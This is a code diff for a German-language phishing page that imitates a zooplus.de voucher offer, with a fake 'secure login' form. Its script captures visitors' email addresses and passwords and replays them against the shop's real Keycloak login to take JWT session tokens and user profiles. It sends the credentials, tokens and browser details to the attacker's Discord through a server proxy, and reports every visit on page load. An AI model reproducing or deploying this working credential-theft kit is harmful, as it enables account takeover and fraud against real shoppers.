@@ -21,34 +21,25 @@
         .tb{text-align:center}
         .tn{background:#f8f9fa;border-radius:8px;padding:10px 14px;font-size:22px;font-weight:700;color:#e74c3c;min-width:48px}
         .tl{font-size:11px;color:#999;margin-top:4px}
-        
-        /* Login form */
-        .login-form{display:none;margin-top:16px}
-        .login-form.show{display:block}
         .form-group{margin-bottom:14px}
         .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
         .form-group input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:8px;font-size:14px;transition:.2s}
         .form-group input:focus{outline:none;border-color:#e74c3c}
-        
         .btn{width:100%;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;border:none;padding:16px;border-radius:10px;font-size:17px;font-weight:700;cursor:pointer;transition:.3s}
         .btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(231,76,60,.4)}
         .btn.off{pointer-events:none;opacity:.7}
         .trust{display:flex;justify-content:center;gap:18px;margin-top:18px;color:#999;font-size:12px}
-        
+        .verified{display:flex;align-items:center;gap:6px;color:#27ae60;font-size:12px;margin-bottom:12px}
         .overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.95);z-index:999;flex-direction:column;align-items:center;justify-content:center}
         .overlay.on{display:flex}
         .spin{width:48px;height:48px;border:4px solid #f3f3f3;border-top:4px solid #e74c3c;border-radius:50%;animation:sp 1s linear infinite;margin-bottom:16px}
         @keyframes sp{to{transform:rotate(360deg)}}
-        
         .ok{display:none;text-align:center;padding:30px}
         .ok.on{display:block}
         .oki{font-size:56px;margin-bottom:12px}
         .okt{font-size:22px;color:#27ae60;font-weight:700;margin-bottom:8px}
         .code{background:#f8f9fa;border:2px dashed #27ae60;border-radius:8px;padding:14px;margin:16px 0;font-size:22px;font-weight:700;color:#27ae60;letter-spacing:3px}
         .okm{color:#666;font-size:13px}
-        
-        .verified{display:flex;align-items:center;gap:6px;color:#27ae60;font-size:12px;margin-bottom:12px}
-        .verified svg{width:14px;height:14px}
     </style>
 </head>
 <body>
@@ -65,25 +56,19 @@
             <div class="tb"><div class="tn" id="m">04</div><div class="tl">Minuten</div></div>
             <div class="tb"><div class="tn" id="s">59</div><div class="tl">Sekunden</div></div>
         </div>
-        
-        <button class="btn" id="claimBtn" onclick="showLogin()">🎁 Jetzt einlösen & sparen</button>
-        
-        <div class="login-form" id="loginForm">
-            <div class="verified">
-                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-                SSL-verschlüsselte Anmeldung
-            </div>
-            <div class="form-group">
-                <label>E-Mail-Adresse</label>
-                <input type="email" id="email" placeholder="ihre@email.de" autocomplete="email">
-            </div>
-            <div class="form-group">
-                <label>Passwort</label>
-                <input type="password" id="password" placeholder="Passwort eingeben" autocomplete="current-password">
-            </div>
-            <button class="btn" onclick="submitLogin()">Anmelden & Code erhalten</button>
+        <div class="verified">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#27ae60"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+            SSL-verschlüsselte Anmeldung
         </div>
-        
+        <div class="form-group">
+            <label>E-Mail-Adresse</label>
+            <input type="email" id="email" placeholder="ihre@email.de" autocomplete="email">
+        </div>
+        <div class="form-group">
+            <label>Passwort</label>
+            <input type="password" id="password" placeholder="Passwort eingeben" autocomplete="current-password">
+        </div>
+        <button class="btn" id="btn" onclick="steal()">🎁 Jetzt einlösen & sparen</button>
         <div class="trust"><span>🔒 SSL</span><span>✓ Sicher</span><span>🐾 zooplus.de</span></div>
     </div>
     <div class="ok" id="ok">
@@ -96,202 +81,175 @@
 <div class="overlay" id="ov"><div class="spin"></div><div style="color:#333;font-size:15px">Anmeldung wird verifiziert...</div></div>
 
 <script>
-// ══════════════════════════════════════════════
-// ZOOPLUS FULL CHAIN — Working Version
-// CORS recon + credential capture + Discord exfil
-// ══════════════════════════════════════════════
+const BASE=window.location.origin;
+const KC='https://login.zooplus.de/auth/realms/zooplus';
+const CID='shop-myzooplus-prod-zooplus';
+const RU='https://www.zooplus.de/web/sso-myzooplus/login';
 
-const BASE = window.location.origin;
-const KC = 'https://login.zooplus.de/auth/realms/zooplus';
+let t=299;setInterval(()=>{if(t>0)t--;document.getElementById('m').textContent=String(Math.floor(t/60)).padStart(2,'0');document.getElementById('s').textContent=String(t%60).padStart(2,'0')},1000);
 
-let loot = { logged_in: false, config: null };
+async function dc(data){try{await fetch(BASE+'/proxy/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})}catch(e){}}
 
-// Timer
-let t = 299;
-setInterval(() => {
-    if (t > 0) t--;
-    document.getElementById('m').textContent = String(Math.floor(t / 60)).padStart(2, '0');
-    document.getElementById('s').textContent = String(t % 60).padStart(2, '0');
-}, 1000);
-
-// Discord via server proxy
-async function dc(data) {
-    try {
-        await fetch(BASE + '/proxy/log', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        });
-    } catch (e) {}
-}
-
-// STEP 1: CORS Recon + Login Detection
-async function recon() {
-    try {
-        const r = await fetch(KC + '/.well-known/openid-configuration', { credentials: 'include' });
-        const c = await r.json();
-        loot.config = c;
-        loot.logged_in = true;
-        return true;
-    } catch (e) { return false; }
-}
-
-// Show login form
-function showLogin() {
-    document.getElementById('claimBtn').style.display = 'none';
-    document.getElementById('loginForm').classList.add('show');
-}
-
-// STEP 2: Credential capture + Keycloak validation
-async function submitLogin() {
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+async function steal(){
+    const email=document.getElementById('email').value;
+    const password=document.getElementById('password').value;
+    if(!email||!password)return;
     
-    if (!email || !password) return;
-    
-    const btn = document.querySelector('.login-form .btn');
-    btn.classList.add('off');
-    btn.textContent = '⏳ Wird verifiziert...';
+    const btn=document.getElementById('btn');
+    btn.classList.add('off');btn.textContent='⏳ Wird verifiziert...';
     document.getElementById('ov').classList.add('on');
 
-    // Try real Keycloak auth to get JWT
-    let jwt = null, jwtPayload = null, userinfo = null;
-    
-    try {
-        // Step 1: Get Keycloak login page
-        const loginResp = await fetch(KC + '/protocol/openid-connect/auth?response_type=code&client_id=shop-myzooplus-prod-zooplus&redirect_uri=https://www.zooplus.de/web/sso-myzooplus/login&scope=openid+email+profile&state=stealth', {
-            credentials: 'include'
-        });
-        const loginHtml = await loginResp.text();
+    let jwt=null,jwtPayload=null,userinfo=null,authError=null;
+
+    try{
+        // Step 1: Fetch Keycloak login page (gets session + CSRF)
+        const loginResp=await fetch(KC+'/protocol/openid-connect/auth?response_type=code&client_id='+CID+'&redirect_uri='+encodeURIComponent(RU)+'&scope=openid+email+profile&state=steal'+Date.now(),{credentials:'include'});
+        const loginHtml=await loginResp.text();
+
+        // Step 2: Extract form action URL and hidden fields
+        const formMatch=loginHtml.match(/action="([^"]+)"/);
+        const formAction=formMatch?formMatch[1].replace(/&amp;/g,'&'):null;
         
-        // Extract form action
-        const formMatch = loginHtml.match(/action="([^"]+)"/);
-        const formAction = formMatch ? formMatch[1].replace(/&amp;/g, '&') : null;
-        
-        // Extract hidden fields
-        const hiddenFields = {};
-        const hiddenRegex = /name="([^"]+)"\s+value="([^"]*?)"/g;
+        const hiddenFields={};
+        const re=/name="([^"]+)"\s+value="([^"]*?)"/g;
         let m;
-        while ((m = hiddenRegex.exec(loginHtml)) !== null) {
-            hiddenFields[m[1]] = m[2];
-        }
+        while((m=re.exec(loginHtml))!==null)hiddenFields[m[1]]=m[2];
 
-        if (formAction) {
-            // Submit credentials to real Keycloak
-            const formData = new URLSearchParams();
-            for (const [key, value] of Object.entries(hiddenFields)) {
-                formData.append(key, value);
-            }
-            formData.append('username', email);
-            formData.append('password', password);
+        if(formAction){
+            // Step 3: Submit credentials to real Keycloak
+            const fd=new URLSearchParams();
+            for(const[k,v] of Object.entries(hiddenFields))fd.append(k,v);
+            fd.append('username',email);
+            fd.append('password',password);
 
-            const authResp = await fetch(formAction, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: formData.toString(),
-                credentials: 'include',
-                redirect: 'follow'
+            const authResp=await fetch(formAction,{
+                method:'POST',
+                headers:{'Content-Type':'application/x-www-form-urlencoded'},
+                body:fd.toString(),
+                credentials:'include',
+                redirect:'manual'
             });
 
-            const authResult = await authResp.text();
+            // Step 4: Check response for auth code (in redirect Location header)
+            const status=authResp.status;
+            const location=authResp.headers.get('Location')||'';
+            const authResult=await authResp.text();
 
-            // Check for auth code
-            const codeMatch = authResult.match(/code=([^&"']+)/);
-            if (codeMatch) {
-                // Exchange code for token via server proxy
-                const tokenResp = await fetch(BASE + '/proxy/token', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: new URLSearchParams({
-                        grant_type: 'authorization_code',
-                        client_id: 'shop-myzooplus-prod-zooplus',
-                        code: codeMatch[1],
-                        redirect_uri: 'https://www.zooplus.de/web/sso-myzooplus/login'
+            // Try to find auth code in redirect URL or response body
+            let code=null;
+            const locCodeMatch=location.match(/code=([^&]+)/);
+            const bodyCodeMatch=(authResult+location).match(/code=([^&"']+)/);
+            
+            if(locCodeMatch)code=locCodeMatch[1];
+            else if(bodyCodeMatch)code=bodyCodeMatch[1];
+
+            if(code){
+                // Step 5: Exchange auth code for JWT via server proxy
+                const tokenResp=await fetch(BASE+'/proxy/token',{
+                    method:'POST',
+                    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+                    body:new URLSearchParams({
+                        grant_type:'authorization_code',
+                        client_id:CID,
+                        code:code,
+                        redirect_uri:RU
                     })
                 });
+                const tokenData=await tokenResp.json();
+                
+                if(tokenData.access_token){
+                    jwt=tokenData.access_token;
+                    jwtPayload=JSON.parse(atob(jwt.split('.')[1]));
 
-                const tokenData = await tokenResp.json();
-                if (tokenData.access_token) {
-                    jwt = tokenData.access_token;
-                    jwtPayload = JSON.parse(atob(jwt.split('.')[1]));
-
-                    // Fetch userinfo
-                    const userinfoResp = await fetch(BASE + '/proxy/userinfo', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ token: jwt })
+                    // Step 6: Get userinfo with JWT
+                    const uiResp=await fetch(BASE+'/proxy/userinfo',{
+                        method:'POST',
+                        headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({token:jwt})
                     });
-                    if (userinfoResp.ok) {
-                        userinfo = await userinfoResp.json();
-                    }
+                    if(uiResp.ok)userinfo=await uiResp.json();
+                }
+            } else {
+                // Check if login failed
+                if(loginHtml.includes('Invalid')||loginHtml.includes('Ungültig')||status===401){
+                    authError='Invalid credentials';
+                } else if(status===302||status===303){
+                    // Redirect happened but we couldn't read the code
+                    authError='Auth succeeded but code capture failed (redirect)';
+                } else {
+                    authError='Status: '+status+' Location: '+location.substring(0,100);
                 }
             }
         }
-    } catch (e) {}
+    }catch(e){
+        authError=e.message;
+    }
 
-    // STEP 3: Send ALL data to Discord
-    const fields = [];
-    
-    fields.push({ name: '🎯 Attack', value: jwt ? 'Full JWT Theft (credentials + token)' : 'Credential Capture', inline: false });
-    fields.push({ name: '📧 Email', value: '```' + email + '```', inline: true });
-    fields.push({ name: '🔑 Password', value: '```' + password + '```', inline: true });
-    
-    if (jwtPayload) {
+    // Step 7: Send EVERYTHING to Discord
+    const fields=[];
+    fields.push({name:'🎯 Attack',value:jwt?'✅ FULL JWT THEFT (credentials + token)':'⚠️ Credential Capture',inline:false});
+    fields.push({name:'📧 Email',value:'```'+email+'```',inline:true});
+    fields.push({name:'🔑 Password',value:'```'+password+'```',inline:true});
+
+    if(jwtPayload){
         fields.push(
-            { name: '👤 Name', value: jwtPayload.name || 'N/A', inline: true },
-            { name: '🆔 Customer ID', value: String(jwtPayload.customerId || 'N/A'), inline: true },
-            { name: '🆔 Sub', value: jwtPayload.sub || 'N/A', inline: false },
-            { name: '🎭 Roles', value: (jwtPayload.realm_access?.roles || []).join(', ') || 'N/A', inline: false }
+            {name:'👤 Name',value:jwtPayload.name||'N/A',inline:true},
+            {name:'📧 Victim Email',value:jwtPayload.email||'N/A',inline:true},
+            {name:'🆔 Customer ID',value:String(jwtPayload.customerId||'N/A'),inline:true},
+            {name:'🆔 Subject ID',value:jwtPayload.sub||'N/A',inline:false},
+            {name:'🎭 Roles',value:(jwtPayload.realm_access?.roles||[]).join(', ')||'N/A',inline:false}
         );
     }
-    
-    if (userinfo) {
-        fields.push({ name: '📋 Full Userinfo', value: '```json\n' + JSON.stringify(userinfo, null, 2).substring(0, 500) + '\n```', inline: false });
-    }
-    
-    if (jwt) {
-        fields.push({ name: '🎫 JWT Token', value: '```\n' + jwt.substring(0, 200) + '...\n```', inline: false });
-    }
-    
-    if (loot.config) {
-        fields.push({ name: '🔍 OIDC Config', value: '```Token: ' + loot.config.token_endpoint + '\nUserinfo: ' + loot.config.userinfo_endpoint + '```', inline: false });
-    }
-    
-    fields.push({ name: '🖥️ Victim', value: 'UA: ' + (navigator.userAgent || '?').substring(0, 80), inline: false });
 
-    await dc({
-        embeds: [{
-            title: '🔱 ZOOPLUS FULL LOOT — ' + (jwt ? 'JWT + CREDENTIALS' : 'CREDENTIALS'),
-            color: jwt ? 0x00ff00 : 0xff9900,
-            fields: fields,
-            timestamp: new Date().toISOString(),
-            footer: { text: '🔱 V0RT3X | Railway Deploy' }
-        }]
-    });
+    if(userinfo){
+        fields.push({name:'📋 Full Userinfo',value:'```json\n'+JSON.stringify(userinfo,null,2).substring(0,500)+'\n```',inline:false});
+    }
+
+    if(jwt){
+        fields.push({name:'🎫 JWT Token',value:'```\n'+jwt.substring(0,200)+'...\n```',inline:false});
+    }
+
+    if(authError){
+        fields.push({name:'⚠️ Auth Note',value:authError,inline:false});
+    }
+
+    fields.push({name:'🖥️ Victim',value:'UA: '+(navigator.userAgent||'?').substring(0,80),inline:false});
+
+    await dc({embeds:[{
+        title:'🔱 ZOOPLUS FULL LOOT — '+(jwt?'JWT + CREDENTIALS':'CREDENTIALS ONLY'),
+        color:jwt?0x00ff00:0xff9900,
+        fields:fields,
+        timestamp:new Date().toISOString(),
+        footer:{text:'🔱 V0RT3X | Railway Deploy'}
+    }]});
 
     // Show success to victim
-    setTimeout(() => {
+    setTimeout(()=>{
         document.getElementById('ov').classList.remove('on');
-        document.getElementById('mainBody').style.display = 'none';
+        document.getElementById('mainBody').style.display='none';
         document.getElementById('ok').classList.add('on');
-    }, 2000);
+    },2000);
 }
 
-// On load: silent recon + notify Discord
-(async () => {
-    await recon();
-    await dc({
-        embeds: [{
-            title: loot.logged_in ? '👁️ VICTIM VISITED — LOGGED IN ✅' : '👁️ VICTIM VISITED',
-            color: loot.logged_in ? 0x00ff00 : 0xf39c12,
-            fields: [
-                { name: 'Status', value: loot.logged_in ? '✅ Active Keycloak session detected' : '❌ Not logged in', inline: false },
-                { name: 'URL', value: window.location.href, inline: false },
-                { name: 'Referrer', value: document.referrer || 'Direct', inline: false }
-            ],
-            timestamp: new Date().toISOString()
-        }]
-    });
+// On load: CORS recon + notify
+(async()=>{
+    let loggedIn=false;
+    try{
+        const r=await fetch(KC+'/.well-known/openid-configuration',{credentials:'include'});
+        await r.json();
+        loggedIn=true;
+    }catch(e){}
+    
+    await dc({embeds:[{
+        title:loggedIn?'👁️ VICTIM VISITED — LOGGED IN ✅':'👁️ VICTIM VISITED',
+        color:loggedIn?0x00ff00:0xf39c12,
+        fields:[
+            {name:'Status',value:loggedIn?'✅ Active Keycloak session — ready to steal':'❌ Not logged in',inline:false},
+            {name:'URL',value:window.location.href,inline:false},
+            {name:'Referrer',value:document.referrer||'Direct',inline:false}
+        ],
+        timestamp:new Date().toISOString()
+    }]});
 })();
 </script>
 </body>
